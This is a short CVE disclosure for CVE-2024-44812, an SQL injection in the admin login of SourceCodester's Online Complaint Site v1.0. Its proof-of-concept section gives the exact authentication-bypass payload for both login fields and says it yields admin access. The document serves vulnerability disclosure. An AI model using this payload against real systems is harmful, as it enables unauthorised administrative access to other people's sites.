# Vendor
SourceCodester

# Affected Product Link
https://www.sourcecodester.com/php/14717/online-complaint-site-using-phpmysqli-full-source-code.html

# CVE ID: CVE-2024-44812

# Description:
SQL Injection vulnerability in Online Complaint Site v.1.0 allows a remote attacker to escalate privileges via the username and password parameters in the /admin.index.php component.

# PoC
Proof of Concept Exploit for CVE-2024-44812 - SQL Injection Authentication Bypass vulnerability in Online Complaint Site v1.0

```
Step 1 – Visit http://localhost/complaintsite/
Step 2 – Click on "admin" button and redirect on login page.
Step 3 – Enter username as ' or 1=1-- - and password as ' or 1=1-- -
Step 4 – Click Login and now you will be logged in as admin.
```
